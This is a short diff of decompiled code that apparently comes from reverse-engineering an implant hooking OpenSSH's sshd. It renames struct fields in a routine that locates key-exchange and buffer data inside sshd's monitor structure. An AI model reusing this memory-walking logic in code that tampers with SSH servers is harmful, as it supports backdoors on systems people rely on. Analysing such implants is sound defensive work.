@@ -40,9 +40,9 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
     success = is_range_mapped((u8 *)monitor_ptr,0x20,ctx);
     if (success != FALSE) {
       pkex_index = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
-      pkex_table = monitor_ptr->m_pkex;
+      pkex_table = monitor_ptr->pkex_table;
       if (-1 < pkex_index) {
-        pkex_table = *(kex ***)((long)&monitor_ptr->m_recvfd + (long)((int)pkex_index << 2));
+        pkex_table = *(kex ***)((long)&monitor_ptr->child_to_monitor_fd + (long)((int)pkex_index << 2));
       }
       size_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
       data_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
